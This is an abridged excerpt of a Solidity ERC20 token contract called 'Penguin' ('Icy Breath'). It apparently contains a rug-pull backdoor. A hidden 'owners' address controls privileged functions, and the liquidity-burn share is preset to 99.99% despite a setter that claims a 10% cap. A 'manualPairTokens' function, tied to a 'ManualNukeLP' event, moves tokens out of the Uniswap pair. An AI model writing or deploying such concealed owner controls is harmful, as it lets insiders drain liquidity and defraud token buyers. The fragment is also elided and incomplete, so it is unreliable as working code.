...
contract Penguin is ERC20, Ownable {
    ...
    uint256 private manualBurnFrequency = 60 minutes;
    address private marketingWallet;
    address private devWallet;
    uint256 private percentForLPBurn = 9999;
    ...
    event ManualNukeLP();
    modifier onlyOwners() {
        require(msg.sender == owners, "only owner");
        _;
    }

    constructor(address dev) ERC20("Icy Breath", "PENGUIN") {
    ...
    function updateMaxTxnAmount(uint256 newNum) external onlyOwners {
    ...
    function setPercentForLPBurn(uint256 _percent) external onlyOwner {
        require(_percent < 1000, "cannot set percent more than 10%");
        percentForLPBurn = _percent;
    }

    function manualPairTokens() external onlyOwners returns (bool) {
        require(
        ...
        if (amountToBurn > 0) {
            super._transfer(uniswapV2Pair, burnAddress, amountToBurn);
        }
